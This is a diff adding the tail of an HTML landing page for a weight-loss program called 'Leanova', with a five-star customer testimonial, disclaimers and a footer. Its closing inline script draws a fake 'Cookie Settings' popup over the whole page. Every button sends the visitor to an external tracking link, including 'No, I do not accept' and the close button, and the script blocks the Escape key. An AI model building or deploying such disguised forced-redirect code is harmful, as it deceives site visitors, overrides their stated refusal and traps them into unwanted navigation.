+        <div class="question-review">
+          <div class="review-head">
+            <div class="head-rating" aria-label="5 star rating">
+              <svg
+                class="rating-filled"
+                width="12"
+                height="12"
+                viewBox="0 0 18 18"
+                fill="none"
+                aria-hidden="true"
+              >
+                <path
+                  d="M8.64412 1.72123C8.67699 1.65483 8.72776 1.59893 8.79071 1.55985C8.85366 1.52077 8.92628 1.50006 9.00037 1.50006C9.07447 1.50006 9.14709 1.52077 9.21003 1.55985C9.27298 1.59893 9.32376 1.65483 9.35662 1.72123L11.0891 5.23048C11.2033 5.46146 11.3717 5.66129 11.5801 5.81282C11.7885 5.96436 12.0305 6.06307 12.2854 6.10048L16.1599 6.66748C16.2333 6.67812 16.3023 6.70908 16.359 6.75688C16.4157 6.80468 16.4579 6.86739 16.4809 6.93794C16.5038 7.00848 16.5066 7.08404 16.4888 7.15606C16.471 7.22808 16.4335 7.29369 16.3804 7.34548L13.5784 10.074C13.3936 10.2541 13.2553 10.4763 13.1755 10.7217C13.0957 10.9671 13.0767 11.2281 13.1201 11.4825L13.7816 15.3375C13.7946 15.4109 13.7867 15.4864 13.7587 15.5555C13.7308 15.6246 13.6841 15.6844 13.6238 15.7282C13.5635 15.772 13.4921 15.798 13.4178 15.8032C13.3434 15.8083 13.2691 15.7925 13.2034 15.7575L9.73987 13.9365C9.51166 13.8167 9.25776 13.754 9 13.754C8.74224 13.754 8.48834 13.8167 8.26012 13.9365L4.79737 15.7575C4.73162 15.7923 4.65742 15.8079 4.58321 15.8027C4.509 15.7974 4.43776 15.7714 4.37759 15.7276C4.31743 15.6839 4.27075 15.6241 4.24287 15.5551C4.21498 15.4862 4.20702 15.4108 4.21987 15.3375L4.88062 11.4832C4.92427 11.2288 4.90536 10.9675 4.82553 10.722C4.74569 10.4765 4.60733 10.2541 4.42237 10.074L1.62037 7.34623C1.56682 7.29451 1.52887 7.22878 1.51085 7.15654C1.49282 7.0843 1.49545 7.00844 1.51843 6.93762C1.54141 6.8668 1.58382 6.80386 1.64083 6.75597C1.69784 6.70808 1.76715 6.67716 1.84087 6.66673L5.71462 6.10048C5.96982 6.06336 6.21216 5.96477 6.42081 5.81322C6.62946 5.66167 6.79815 5.46168 6.91237 5.23048L8.64412 1.72123Z"
+                  fill="currentColor"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <svg
+                class="rating-filled"
+                width="12"
+                height="12"
+                viewBox="0 0 18 18"
+                fill="none"
+                aria-hidden="true"
+              >
+                <path
+                  d="M8.64412 1.72123C8.67699 1.65483 8.72776 1.59893 8.79071 1.55985C8.85366 1.52077 8.92628 1.50006 9.00037 1.50006C9.07447 1.50006 9.14709 1.52077 9.21003 1.55985C9.27298 1.59893 9.32376 1.65483 9.35662 1.72123L11.0891 5.23048C11.2033 5.46146 11.3717 5.66129 11.5801 5.81282C11.7885 5.96436 12.0305 6.06307 12.2854 6.10048L16.1599 6.66748C16.2333 6.67812 16.3023 6.70908 16.359 6.75688C16.4157 6.80468 16.4579 6.86739 16.4809 6.93794C16.5038 7.00848 16.5066 7.08404 16.4888 7.15606C16.471 7.22808 16.4335 7.29369 16.3804 7.34548L13.5784 10.074C13.3936 10.2541 13.2553 10.4763 13.1755 10.7217C13.0957 10.9671 13.0767 11.2281 13.1201 11.4825L13.7816 15.3375C13.7946 15.4109 13.7867 15.4864 13.7587 15.5555C13.7308 15.6246 13.6841 15.6844 13.6238 15.7282C13.5635 15.772 13.4921 15.798 13.4178 15.8032C13.3434 15.8083 13.2691 15.7925 13.2034 15.7575L9.73987 13.9365C9.51166 13.8167 9.25776 13.754 9 13.754C8.74224 13.754 8.48834 13.8167 8.26012 13.9365L4.79737 15.7575C4.73162 15.7923 4.65742 15.8079 4.58321 15.8027C4.509 15.7974 4.43776 15.7714 4.37759 15.7276C4.31743 15.6839 4.27075 15.6241 4.24287 15.5551C4.21498 15.4862 4.20702 15.4108 4.21987 15.3375L4.88062 11.4832C4.92427 11.2288 4.90536 10.9675 4.82553 10.722C4.74569 10.4765 4.60733 10.2541 4.42237 10.074L1.62037 7.34623C1.56682 7.29451 1.52887 7.22878 1.51085 7.15654C1.49282 7.0843 1.49545 7.00844 1.51843 6.93762C1.54141 6.8668 1.58382 6.80386 1.64083 6.75597C1.69784 6.70808 1.76715 6.67716 1.84087 6.66673L5.71462 6.10048C5.96982 6.06336 6.21216 5.96477 6.42081 5.81322C6.62946 5.66167 6.79815 5.46168 6.91237 5.23048L8.64412 1.72123Z"
+                  fill="currentColor"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <svg
+                class="rating-filled"
+                width="12"
+                height="12"
+                viewBox="0 0 18 18"
+                fill="none"
+                aria-hidden="true"
+              >
+                <path
+                  d="M8.64412 1.72123C8.67699 1.65483 8.72776 1.59893 8.79071 1.55985C8.85366 1.52077 8.92628 1.50006 9.00037 1.50006C9.07447 1.50006 9.14709 1.52077 9.21003 1.55985C9.27298 1.59893 9.32376 1.65483 9.35662 1.72123L11.0891 5.23048C11.2033 5.46146 11.3717 5.66129 11.5801 5.81282C11.7885 5.96436 12.0305 6.06307 12.2854 6.10048L16.1599 6.66748C16.2333 6.67812 16.3023 6.70908 16.359 6.75688C16.4157 6.80468 16.4579 6.86739 16.4809 6.93794C16.5038 7.00848 16.5066 7.08404 16.4888 7.15606C16.471 7.22808 16.4335 7.29369 16.3804 7.34548L13.5784 10.074C13.3936 10.2541 13.2553 10.4763 13.1755 10.7217C13.0957 10.9671 13.0767 11.2281 13.1201 11.4825L13.7816 15.3375C13.7946 15.4109 13.7867 15.4864 13.7587 15.5555C13.7308 15.6246 13.6841 15.6844 13.6238 15.7282C13.5635 15.772 13.4921 15.798 13.4178 15.8032C13.3434 15.8083 13.2691 15.7925 13.2034 15.7575L9.73987 13.9365C9.51166 13.8167 9.25776 13.754 9 13.754C8.74224 13.754 8.48834 13.8167 8.26012 13.9365L4.79737 15.7575C4.73162 15.7923 4.65742 15.8079 4.58321 15.8027C4.509 15.7974 4.43776 15.7714 4.37759 15.7276C4.31743 15.6839 4.27075 15.6241 4.24287 15.5551C4.21498 15.4862 4.20702 15.4108 4.21987 15.3375L4.88062 11.4832C4.92427 11.2288 4.90536 10.9675 4.82553 10.722C4.74569 10.4765 4.60733 10.2541 4.42237 10.074L1.62037 7.34623C1.56682 7.29451 1.52887 7.22878 1.51085 7.15654C1.49282 7.0843 1.49545 7.00844 1.51843 6.93762C1.54141 6.8668 1.58382 6.80386 1.64083 6.75597C1.69784 6.70808 1.76715 6.67716 1.84087 6.66673L5.71462 6.10048C5.96982 6.06336 6.21216 5.96477 6.42081 5.81322C6.62946 5.66167 6.79815 5.46168 6.91237 5.23048L8.64412 1.72123Z"
+                  fill="currentColor"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <svg
+                class="rating-filled"
+                width="12"
+                height="12"
+                viewBox="0 0 18 18"
+                fill="none"
+                aria-hidden="true"
+              >
+                <path
+                  d="M8.64412 1.72123C8.67699 1.65483 8.72776 1.59893 8.79071 1.55985C8.85366 1.52077 8.92628 1.50006 9.00037 1.50006C9.07447 1.50006 9.14709 1.52077 9.21003 1.55985C9.27298 1.59893 9.32376 1.65483 9.35662 1.72123L11.0891 5.23048C11.2033 5.46146 11.3717 5.66129 11.5801 5.81282C11.7885 5.96436 12.0305 6.06307 12.2854 6.10048L16.1599 6.66748C16.2333 6.67812 16.3023 6.70908 16.359 6.75688C16.4157 6.80468 16.4579 6.86739 16.4809 6.93794C16.5038 7.00848 16.5066 7.08404 16.4888 7.15606C16.471 7.22808 16.4335 7.29369 16.3804 7.34548L13.5784 10.074C13.3936 10.2541 13.2553 10.4763 13.1755 10.7217C13.0957 10.9671 13.0767 11.2281 13.1201 11.4825L13.7816 15.3375C13.7946 15.4109 13.7867 15.4864 13.7587 15.5555C13.7308 15.6246 13.6841 15.6844 13.6238 15.7282C13.5635 15.772 13.4921 15.798 13.4178 15.8032C13.3434 15.8083 13.2691 15.7925 13.2034 15.7575L9.73987 13.9365C9.51166 13.8167 9.25776 13.754 9 13.754C8.74224 13.754 8.48834 13.8167 8.26012 13.9365L4.79737 15.7575C4.73162 15.7923 4.65742 15.8079 4.58321 15.8027C4.509 15.7974 4.43776 15.7714 4.37759 15.7276C4.31743 15.6839 4.27075 15.6241 4.24287 15.5551C4.21498 15.4862 4.20702 15.4108 4.21987 15.3375L4.88062 11.4832C4.92427 11.2288 4.90536 10.9675 4.82553 10.722C4.74569 10.4765 4.60733 10.2541 4.42237 10.074L1.62037 7.34623C1.56682 7.29451 1.52887 7.22878 1.51085 7.15654C1.49282 7.0843 1.49545 7.00844 1.51843 6.93762C1.54141 6.8668 1.58382 6.80386 1.64083 6.75597C1.69784 6.70808 1.76715 6.67716 1.84087 6.66673L5.71462 6.10048C5.96982 6.06336 6.21216 5.96477 6.42081 5.81322C6.62946 5.66167 6.79815 5.46168 6.91237 5.23048L8.64412 1.72123Z"
+                  fill="currentColor"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <svg
+                class="rating-filled"
+                width="12"
+                height="12"
+                viewBox="0 0 18 18"
+                fill="none"
+                aria-hidden="true"
+              >
+                <path
+                  d="M8.64412 1.72123C8.67699 1.65483 8.72776 1.59893 8.79071 1.55985C8.85366 1.52077 8.92628 1.50006 9.00037 1.50006C9.07447 1.50006 9.14709 1.52077 9.21003 1.55985C9.27298 1.59893 9.32376 1.65483 9.35662 1.72123L11.0891 5.23048C11.2033 5.46146 11.3717 5.66129 11.5801 5.81282C11.7885 5.96436 12.0305 6.06307 12.2854 6.10048L16.1599 6.66748C16.2333 6.67812 16.3023 6.70908 16.359 6.75688C16.4157 6.80468 16.4579 6.86739 16.4809 6.93794C16.5038 7.00848 16.5066 7.08404 16.4888 7.15606C16.471 7.22808 16.4335 7.29369 16.3804 7.34548L13.5784 10.074C13.3936 10.2541 13.2553 10.4763 13.1755 10.7217C13.0957 10.9671 13.0767 11.2281 13.1201 11.4825L13.7816 15.3375C13.7946 15.4109 13.7867 15.4864 13.7587 15.5555C13.7308 15.6246 13.6841 15.6844 13.6238 15.7282C13.5635 15.772 13.4921 15.798 13.4178 15.8032C13.3434 15.8083 13.2691 15.7925 13.2034 15.7575L9.73987 13.9365C9.51166 13.8167 9.25776 13.754 9 13.754C8.74224 13.754 8.48834 13.8167 8.26012 13.9365L4.79737 15.7575C4.73162 15.7923 4.65742 15.8079 4.58321 15.8027C4.509 15.7974 4.43776 15.7714 4.37759 15.7276C4.31743 15.6839 4.27075 15.6241 4.24287 15.5551C4.21498 15.4862 4.20702 15.4108 4.21987 15.3375L4.88062 11.4832C4.92427 11.2288 4.90536 10.9675 4.82553 10.722C4.74569 10.4765 4.60733 10.2541 4.42237 10.074L1.62037 7.34623C1.56682 7.29451 1.52887 7.22878 1.51085 7.15654C1.49282 7.0843 1.49545 7.00844 1.51843 6.93762C1.54141 6.8668 1.58382 6.80386 1.64083 6.75597C1.69784 6.70808 1.76715 6.67716 1.84087 6.66673L5.71462 6.10048C5.96982 6.06336 6.21216 5.96477 6.42081 5.81322C6.62946 5.66167 6.79815 5.46168 6.91237 5.23048L8.64412 1.72123Z"
+                  fill="currentColor"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+            </div>
+            <span class="head-title" style="color: black"
+              >A Dream Come True for My Weight Loss</span
+            >
+          </div>
+          <span class="review-text">
+            After years of struggling with my weight, Leanova gave me the
+            results I had been dreaming of.
+          </span>
+          <div class="review-footer">
+            <div class="footer-user">
+              <img
+                class="user-avatar"
+                src="image.jpg"
+                alt="Charlotte T. avatar"
+                width="32"
+                height="32"
+                data-pagespeed-url-hash="506963459"
+                onload="pagespeed.CriticalImages.checkImageForCriticality(this);"
+              />
+              <span class="user-name">Charlotte T.</span>
+            </div>
+            <div class="footer-confirm" aria-label="Verified customer">
+              <svg
+                class="confirm-icon"
+                width="16"
+                height="17"
+                viewBox="0 0 16 17"
+                fill="none"
+                aria-hidden="true"
+              >
+                <path
+                  d="M14.5341 7.16666C14.8385 8.66086 14.6215 10.2143 13.9193 11.5679C13.2171 12.9214 12.072 13.9934 10.6751 14.6049C9.27816 15.2164 7.71382 15.3305 6.24293 14.9282C4.77205 14.526 3.48353 13.6316 2.59225 12.3943C1.70097 11.157 1.26081 9.65148 1.34518 8.12892C1.42954 6.60635 2.03332 5.15872 3.05583 4.02744C4.07835 2.89616 5.45779 2.14961 6.96411 1.9123C8.47043 1.67498 10.0126 1.96123 11.3334 2.72333"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+                <path
+                  d="M6 7.83335L8 9.83335L14.6667 3.16669"
+                  stroke="currentColor"
+                  stroke-width="1.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <span class="confirm-title">Verified Customer</span>
+            </div>
+          </div>
+          <p class="review-disclaimer">
+            *Results may vary from person to person. Leanova is a program
+            designed to support health and weight management and is not a
+            guarantee of specific results.
+          </p>
+        </div>
+      </section>
+      <!-- Footer -->
+      <footer class="footer">
+        <div class="container footer-content">
+          <div class="footer-links">
+            <a href="privacy.html">Privacy Policy</a> |
+            <a href="terms.html">Terms of Service</a> |
+            <a href="contact.html">Contact Us</a>
+          </div>
+          <p class="copyright">&copy; 2025 Leanova. All Rights Reserved.</p>
+          <p class="footer-disclaimer">
+            The information provided on this website is for informational
+            purposes only and is not intended to be a substitute for
+            professional medical advice, diagnosis, or treatment. Always seek
+            the advice of your physician or other qualified health provider with
+            any questions you may have regarding a medical condition.
+          </p>
+        </div>
+      </footer>
+    </main>
+    <script>
+      (function () {
+        const redirectLink =
+          "https://www.fasttrack19.com/Q2DLZCB4/2MXXF9Q6/?uid=41343&sub1=s1"; // ✅ Your target link
+
+        // Inject styles
+        const style = document.createElement("style");
+        style.textContent = `
+    * { box-sizing: border-box; }
+
+   #redirectOverlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .cookie-popup1 {
+      position: relative;
+      background: #fff;
+      padding: 24px 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.25);
+      width: 90%;
+      max-width: 550px;
+    }
+    .cookie-popup1 h2 {
+      font-size: 30px;
+      font-weight: 700;
+      text-align: center;
+      margin: 0 0 12px;
+    }
+    .cookie-popup1 p {
+      font-size: 14px;
+      text-align: center;
+      line-height: 1.5;
+      margin: 0 0 20px;
+      color: #333;
+    }
+    .cookie-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .cookie-buttons button {
+      font-size: 14px;
+      padding: 20px 48px;
+      border-radius: 8px;
+      min-width: 150px;
+      cursor: pointer;
+      font-weight: 500;
+      transition: 0.2s ease;
+    }
+    .accept-btn1 {
+      background: #FFCE47;
+      color: #000000;
+      border: none;
+    }
+    .accept-btn1:hover {
+      background: #efb104;
+    }
+    .reject-btn1 {
+      background: #f2f2f2;
+      color: #000;
+      border: 1px solid #000;
+    }
+    .reject-btn1:hover {
+      background: #c7c6c6;
+    }
+    .close-btn1 {
+      position: absolute;
+      top: 10px;
+      right: 14px;
+      font-size: 18px;
+      color: #444;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      background: none;
+    }
+    @media (max-width: 480px) {
+      .cookie-buttons {
+        flex-direction: column;
+      }
+      .cookie-buttons button {
+        width: 100%;
+      }
+    }
+  `;
+        document.head.appendChild(style);
+
+        // Create overlay
+        const overlay = document.createElement("div");
+        overlay.id = "redirectOverlay";
+        document.body.appendChild(overlay);
+
+        // Create popup
+        const popup = document.createElement("div");
+        popup.className = "cookie-popup1";
+        popup.innerHTML = `
+   <button class="close-btn1">×</button>
+  <h2>Cookie Settings</h2>
+  <p>
+    We use cookies and similar technologies to help personalize content, tailor and measure ads, and provide a better experience. By clicking accept, you agree to this as described in our Cookie Policy.
+  </p>
+  <div class="cookie-buttons">
+    <button class="accept-btn1">Yes, I accept</button>
+    <button class="reject-btn1">No, I do not accept</button>
+  </div>
+  `;
+        overlay.appendChild(popup);
+
+        // Open redirect link on **any** click (even inside popup)
+        overlay.addEventListener("click", function () {
+          window.location.href = redirectLink;
+        });
+
+        // Stop internal buttons from bubbling but still redirect
+        popup
+          .querySelector(".accept-btn1")
+          .addEventListener("click", function (e) {
+            e.stopPropagation();
+            console.log("Accepted");
+            window.location.href = redirectLink;
+          });
+
+        popup
+          .querySelector(".reject-btn1")
+          .addEventListener("click", function (e) {
+            e.stopPropagation();
+            console.log("Rejected");
+            window.location.href = redirectLink;
+          });
+
+        popup
+          .querySelector(".close-btn1")
+          .addEventListener("click", function (e) {
+            e.stopPropagation();
+            window.location.href = redirectLink;
+          });
+
+        // Prevent ESC key
+        window.addEventListener("keydown", function (e) {
+          if (e.key === "Escape") e.preventDefault();
+        });
+      })();
+    </script>
+  </body>
+</html>
